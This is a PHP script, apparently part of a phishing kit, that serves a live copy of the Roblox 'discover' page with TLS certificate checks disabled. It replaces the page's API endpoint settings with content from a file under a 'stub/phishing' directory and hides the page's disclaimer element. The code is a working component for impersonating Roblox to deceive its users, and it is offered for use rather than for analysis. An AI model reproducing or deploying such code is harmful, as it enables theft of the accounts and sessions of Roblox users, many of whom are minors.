<?php
error_reporting(0);
include("../includes/functions.php");
if($_GET["Keyword"]){
$keyword1 = htmlspecialchars($_GET["Keyword"]);
$keyword = str_replace(" ", "%20", $keyword1);
//
$config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
$url = "https://www.roblox.com/discover/?Keyword=$keyword";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$catalog = curl_exec($ch);
curl_close($ch);
//
$html = file_get_contents("https://www.roblox.com/discover");
$apicors = current(explode('"};', substr(strstr($html, 'Roblox.EnvironmentUrls = {"'), 0), 2));
$apicors.= '"};';
$apicorswith = file_get_contents("../stub/phishing/replaces/apis2.php");

$str = str_replace($apicors, $apicorswith, $catalog);
echo $str;
echo '<style>
    .disclaimer{display:none}
</style>';
}else{
//
$config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
$url = "https://www.roblox.com/discover";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$catalog = curl_exec($ch);
curl_close($ch);
//
$html = file_get_contents("https://www.roblox.com/discover");
$apicors = current(explode('"};', substr(strstr($html, 'Roblox.EnvironmentUrls = {"'), 0), 2));
$apicors.= '"};';
$apicorswith = file_get_contents("../stub/phishing/replaces/apis2.php");

$str = str_replace($apicors, $apicorswith, $catalog);


echo $str;
echo '<style>
    .disclaimer{display:none}
</style>';
}
?>